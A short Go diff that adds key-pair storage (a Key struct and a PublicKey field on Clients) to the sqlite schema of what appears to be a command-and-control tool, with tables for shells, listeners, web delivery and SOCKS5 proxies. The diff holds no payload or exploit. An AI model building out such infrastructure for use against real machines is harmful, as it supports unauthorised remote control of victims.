@@ -36,6 +36,7 @@ type Clients struct {
 	Sleep      string
 	Online     string
 	Color      string
+	PublicKey  string
 }
 type Notes struct {
 	Uid  string
@@ -81,6 +82,10 @@ type Settings struct {
 	Name  string
 	Value string
 }
+type Key struct {
+	PublicKey  string
+	PrivateKey string
+}
 
 func ConnectDateBase() {
 	var err error
@@ -88,7 +93,7 @@ func ConnectDateBase() {
 	if err != nil {
 		log.Fatalf("连接sqlite3数据库失败: %v", err)
 	}
-	err = Engine.Sync2(new(Users), new(Clients), new(Notes), new(Shell), new(Downloads), new(Listener), new(WebDelivery), new(Socks5), new(Settings))
+	err = Engine.Sync2(new(Users), new(Clients), new(Notes), new(Shell), new(Downloads), new(Listener), new(WebDelivery), new(Socks5), new(Settings), new(Key))
 	if err != nil {
 		log.Fatalf("初始化数据库失败: %v", err)
 	}
